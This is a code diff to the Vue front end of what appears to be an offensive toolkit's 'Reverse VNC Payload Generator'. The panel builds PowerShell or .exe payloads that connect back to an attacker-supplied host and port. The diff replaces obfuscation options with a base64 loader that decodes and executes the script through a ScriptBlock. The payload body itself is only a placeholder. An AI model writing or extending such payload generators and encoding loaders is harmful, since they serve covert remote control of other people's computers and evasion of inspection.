@@ -255,11 +255,11 @@
       </el-tab-pane>
 
       <!-- VNC Panel - Reverse VNC Payload Generator -->
-      <el-tab-pane label="Remote Control" name="vnc">
+      <el-tab-pane label="VNC" name="vnc">
         <div class="vnc-panel">
           <div class="panel-header">
             <h3>Reverse VNC Payload Generator</h3>
-            <p>Generate obfuscated PowerShell VNC payloads for remote screen control</p>
+            <p>Generate PowerShell VNC payloads for remote screen control</p>
           </div>
           
           <!-- VNC Configuration Form -->
@@ -282,22 +282,17 @@
               
               <el-row :gutter="20">
                 <el-col :span="12">
-                  <el-form-item label="Obfuscation Level:">
-                    <el-select v-model="vncForm.obfuscation" placeholder="Select obfuscation">
-                      <el-option label="None" value="none" />
-                      <el-option label="Basic" value="basic" />
-                      <el-option label="Advanced" value="advanced" />
-                      <el-option label="Maximum" value="maximum" />
+                  <el-form-item label="Payload Type:">
+                    <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
+                      <el-option label="PowerShell" value="powershell" />
+                      <el-option label="Executable (.exe)" value="exe" />
                     </el-select>
                   </el-form-item>
                 </el-col>
                 <el-col :span="12">
-                  <el-form-item label="Payload Type:">
-                    <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
-                      <el-option label="Loader + Obfuscator" value="loader" />
-                      <el-option label="Raw Payload" value="raw" />
-                      <el-option label="One-liner" value="oneliner" />
-                    </el-select>
+                  <el-form-item label="Use Loader:">
+                    <el-switch v-model="vncForm.useLoader" />
+                    <span class="form-help">Apply base64 encoding wrapper</span>
                   </el-form-item>
                 </el-col>
               </el-row>
@@ -325,8 +320,8 @@
             <div class="vnc-info">
               <p><strong>LHOST:</strong> {{ vncForm.lhost }}</p>
               <p><strong>LPORT:</strong> {{ vncForm.lport }}</p>
-              <p><strong>Obfuscation:</strong> {{ vncForm.obfuscation }}</p>
               <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
+              <p><strong>Loader:</strong> {{ vncForm.useLoader ? 'Enabled' : 'Disabled' }}</p>
               <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
             </div>
             <div class="code-container">
@@ -361,8 +356,8 @@
               <el-table-column prop="timestamp" label="Generated" width="180" />
               <el-table-column prop="lhost" label="LHOST" width="120" />
               <el-table-column prop="lport" label="LPORT" width="80" />
-              <el-table-column prop="obfuscation" label="Obfuscation" width="100" />
               <el-table-column prop="payloadType" label="Type" width="120" />
+              <el-table-column prop="useLoader" label="Loader" width="80" />
               <el-table-column prop="payload" label="Payload" width="300" />
               <el-table-column label="Actions" width="150">
                 <template #default="scope">
@@ -556,8 +551,8 @@ const creatingListener = ref(false)
 const vncForm = ref({
   lhost: '',
   lport: '5900',
-  obfuscation: 'basic',
-  payloadType: 'loader'
+  payloadType: 'powershell',
+  useLoader: true
 })
 const generatingVnc = ref(false)
 const generatedVncPayload = ref('')
@@ -567,8 +562,8 @@ interface VncHistoryItem {
   timestamp: string
   lhost: string
   lport: string
-  obfuscation: string
   payloadType: string
+  useLoader: boolean
   payload: string
 }
 
@@ -885,15 +880,20 @@ const generateVncPayload = async () => {
   try {
     // TODO: Replace with actual PowerShell VNC payload generation
     // This is a placeholder - you'll provide the actual PowerShell code
-    const payload = `# VNC Payload for ${vncForm.value.lhost}:${vncForm.value.lport}
-# Obfuscation: ${vncForm.value.obfuscation}
+    let payload = `# VNC Payload for ${vncForm.value.lhost}:${vncForm.value.lport}
 # Type: ${vncForm.value.payloadType}
+# Loader: ${vncForm.value.useLoader ? 'Enabled' : 'Disabled'}
 
 # Your PowerShell VNC code will go here
 # LHOST: ${vncForm.value.lhost}
 # LPORT: ${vncForm.value.lport}
 
 Write-Host "VNC Payload generated for ${vncForm.value.lhost}:${vncForm.value.lport}"`
+    
+    // Apply loader if enabled
+    if (vncForm.value.useLoader) {
+      payload = applyVncLoader(payload)
+    }
     
     generatedVncPayload.value = payload
     ElMessage.success('VNC payload generated successfully!')
@@ -904,12 +904,26 @@ Write-Host "VNC Payload generated for ${vncForm.value.lhost}:${vncForm.value.lpo
   }
 }
 
+const applyVncLoader = (inputScript: string): string => {
+  function getEncodedString(text: string): string {
+    return btoa(unescape(encodeURIComponent(text)))
+  }
+
+  const encodedScript = getEncodedString(inputScript)
+  const wrapperLoaderForPayload = `$enc = [System.Text.Encoding]::Unicode
+$decoded = $enc.GetString([Convert]::FromBase64String('${encodedScript}'))
+$scriptBlock = [ScriptBlock]::Create($decoded)
+& $scriptBlock`
+  
+  return wrapperLoaderForPayload
+}
+
 const clearVncForm = () => {
   vncForm.value = {
     lhost: '',
     lport: '5900',
-    obfuscation: 'basic',
-    payloadType: 'loader'
+    payloadType: 'powershell',
+    useLoader: true
   }
   generatedVncPayload.value = ''
 }
@@ -948,8 +962,8 @@ const saveVncToHistory = () => {
     timestamp: new Date().toLocaleString(),
     lhost: vncForm.value.lhost,
     lport: vncForm.value.lport,
-    obfuscation: vncForm.value.obfuscation,
     payloadType: vncForm.value.payloadType,
+    useLoader: vncForm.value.useLoader,
     payload: generatedVncPayload.value
   }
   
@@ -960,8 +974,8 @@ const saveVncToHistory = () => {
 const loadVncFromHistory = (item: any) => {
   vncForm.value.lhost = item.lhost
   vncForm.value.lport = item.lport
-  vncForm.value.obfuscation = item.obfuscation
   vncForm.value.payloadType = item.payloadType
+  vncForm.value.useLoader = item.useLoader
   generatedVncPayload.value = item.payload
   ElMessage.success('VNC payload loaded from history')
 }
